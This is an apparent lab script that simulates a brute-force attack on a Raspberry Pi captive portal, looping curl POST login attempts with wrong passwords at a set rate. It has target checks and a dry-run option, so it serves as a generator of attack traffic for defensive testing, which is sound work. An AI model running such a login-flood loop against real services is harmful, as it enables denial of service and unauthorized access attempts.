#!/usr/bin/env bash
# Captive-portal brute force: repeated POST /portal/login to the Pi (curl). Pi only. Attacker host only.
#   bash lab/attacks/portal_bruteforce.sh --target <pi-ip> --pi-ip IP --victim-net CIDR --protected-net CIDR \
#        [--port 8080] [--rate 5] [--user labuser] [--duration 30] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
PORT=8080
RATE=5
USER_NAME=labuser
set -- "${REST[@]}"
while (($#)); do
  case "$1" in
    --port) PORT="${2:?}"; shift ;;
    --rate) RATE="${2:?}"; shift ;;
    --user) USER_NAME="${2:?}"; shift ;;
    *) no_extra_args "$@" ;;
  esac
  shift
done
require_pi_target
require_number "$PORT" "--port"
require_number "$RATE" "--rate"
[[ "$USER_NAME" =~ ^[A-Za-z0-9_.-]{1,32}$ ]] || refuse "--user $USER_NAME is not a plain user name"
tool_version curl
# One login attempt per 1/RATE s with a fresh wrong password; the loop is the attack.
LOOP='i=0; while :; do i=$((i + 1)); curl -s -o /dev/null -m 2 --data "username=$2&password=wrong$i" "http://$1:$3/portal/login" & sleep "$4"; done'
run_attack bash -c "$LOOP" portal-bruteforce "$DEST" "$USER_NAME" "$PORT" "$(awk -v r="$RATE" 'BEGIN { printf "%.3f", 1 / r }')"
